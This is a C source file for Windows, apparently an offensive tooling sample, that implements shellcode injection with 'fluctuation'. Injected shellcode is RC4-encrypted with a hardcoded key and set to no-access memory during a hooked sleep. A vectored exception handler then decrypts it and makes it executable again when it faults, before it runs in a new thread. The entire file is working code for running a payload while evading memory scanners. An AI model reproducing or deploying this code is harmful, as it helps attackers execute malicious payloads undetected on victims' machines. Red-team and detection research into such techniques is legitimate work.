#include "ShellcodeFluctuation.h"

// TODO: Add x32 support & fix this garbage code

PVOID	ShellcodeAddress	= NULL;
SIZE_T	ShellcodeSize		= 0;

BOOLEAN ShellcodeFluctuation(_In_ BOOLEAN IsEncrypted);

VOID WINAPI My_Sleep
(
	_In_ DWORD dwMilliseconds
)
{

	INFO("Setting Protection to: NOACCESS");
	ShellcodeFluctuation(TRUE);

	Sleep(dwMilliseconds);

	// since we are using NOACCESS for our Mem Protection, this should trigger a EXCEPTION_ACCESS_VIOLATION which our VEH handler should catch (hopefully)
	
	// you could also call the decryption from here, but because we are using NOACCESS, it will trigger an EXCEPTION_ACCESS_VIOLATION
	//ShellcodeFluctuation(FALSE);

}

VOID RC4
(
	_In_ PVOID	PayloadAddress,
	_In_ SIZE_T PayloadSize
)
{

	BYTE Rc4Key[16]		= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 }; // I'm lazy, you could just use rand
	USTRING Key			= { .Buffer = (PUCHAR)&Rc4Key };			Key.Length	= Key.MaximumLength		= sizeof(Rc4Key);
	USTRING Data		= { .Buffer = (PUCHAR)PayloadAddress };		Data.Length = Data.MaximumLength	= PayloadSize;



	LOADAPI(_SystemFunction033, SystemFunction033, L"Advapi32.dll");

	SystemFunction033(&Data, &Key);

}

BOOL ReadTargetFileW
(
	_In_	LPCWSTR		PeName,
	_Out_	DWORD*		BufferSize,
	_Out_	LPVOID*		lpBuffer
)
{

	HANDLE	hFile				= NULL;
	BOOL	State				= TRUE;
	DWORD	lpNumberOfBytesRead = 0;
	DWORD	NumberOfBytesRead	= 0;

	if (!PeName || !lpBuffer)
		return FALSE;

	if (!(hFile = CreateFileW(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) || hFile == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Current File Handle", hFile);

	if (!(NumberOfBytesRead = GetFileSize(hFile, NULL)) || NumberOfBytesRead == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Current File Size", NumberOfBytesRead);

	if (!(*lpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesRead)) || *lpBuffer == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesRead);

	if (!ReadFile(hFile, *lpBuffer, NumberOfBytesRead, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto _END_FUNC;
	}

	OKAY("Successfully Read File!");

	*BufferSize = NumberOfBytesRead;

_END_FUNC:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOLEAN ShellcodeFluctuation
(
	_In_ BOOLEAN IsEncrypted
)
{

	DWORD OldProtection = 0;

	INFO("[0x%p] Shellcode Address", ShellcodeAddress);
	INFO("[%zu] Shellcode Size", ShellcodeSize);

	if (!VirtualProtect(ShellcodeAddress, ShellcodeSize, PAGE_READWRITE, &OldProtection))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("Starting Memory Protection: RW");

	RC4(ShellcodeAddress, ShellcodeSize);

	if (IsEncrypted == TRUE)
	{

		if (!VirtualProtect(ShellcodeAddress, ShellcodeSize, PAGE_NOACCESS, &OldProtection)) // if encrypted, change to NOACCESS
		{
			PRINT_ERROR("VirtualProtect");
			return FALSE;
		}

		INFO("Memory Protection: NA");

	}
	else
	{

		if (!VirtualProtect(ShellcodeAddress, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection)) // if it is not encrypted, change to RX
		{
			PRINT_ERROR("VirtualProtect");
			return FALSE;
		}

		INFO("Memory Protection: RX");

	}

	return TRUE;

}

BOOLEAN LocalShellcodeInjection
(
	_In_ PVOID	Payload,
	_In_ SIZE_T PayloadSize
)
{

	PVOID PayloadBuffer = NULL;
	PVOID ThreadHandle	= NULL;

	DWORD OldProtection = 0;

	if (!(PayloadBuffer = VirtualAlloc(NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
	{
		PRINT_ERROR("VirtualAlloc");
		return FALSE;
	}

	INFO("[0x%p] Payload Buffer", PayloadBuffer);
	INFO("Allocated %zu bytes to Buffer", PayloadSize);

	RtlCopyMemory(PayloadBuffer, Payload, PayloadSize);

	ShellcodeAddress	= PayloadBuffer;
	ShellcodeSize		= PayloadSize;

	// this isn't practical, as you would need to call My_Sleep inside the injector/main function(s) itself
	// it would be far better to call this as its own function, but it works lol
	My_Sleep(10000); // wait 10 seconds

	if (!VirtualProtect(PayloadBuffer, PayloadSize, PAGE_EXECUTE_READ, &OldProtection))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("Protection: PAGE_EXECUTE_READ");

	if (!(ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadBuffer, NULL, 0, NULL)))
	{
		PRINT_ERROR("CreateThread");
		return FALSE;
	}

	INFO("[0x%p] Thread Handle", ThreadHandle);
	INFO("Waiting...");

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("Done!");

	return TRUE;

}

LONG VectoredExceptionHandler
(
	_In_ PEXCEPTION_POINTERS Exception
)
{

	if (Exception->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) // 0xC0000005
	{

		if ((Exception->ContextRecord->Rip >= (ULONG_PTR)ShellcodeAddress) && (Exception->ContextRecord->Rip <= ((ULONG_PTR)ShellcodeAddress + ShellcodeSize)))
		{


			INFO("Decrypting Shellcode to RX...");
			ShellcodeFluctuation(FALSE);

			return EXCEPTION_CONTINUE_EXECUTION;

		}

	}

	return EXCEPTION_CONTINUE_SEARCH;

}